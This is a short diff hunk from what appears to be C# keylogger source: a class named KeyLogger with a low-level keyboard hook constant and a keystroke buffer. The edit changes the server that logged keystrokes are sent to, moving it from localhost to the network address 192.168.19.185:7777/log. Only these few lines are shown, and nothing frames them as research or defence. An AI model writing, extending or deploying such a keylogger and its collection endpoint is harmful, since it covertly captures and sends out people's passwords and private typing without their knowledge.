@@ -7,7 +7,7 @@ using System.Threading;
 
 class KeyLogger
 {
-    private static string URL = "http://127.0.0.1:7777/log";
+    private static string URL = "http://192.168.19.185:7777/log";
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private static StringBuilder buffer = new StringBuilder();
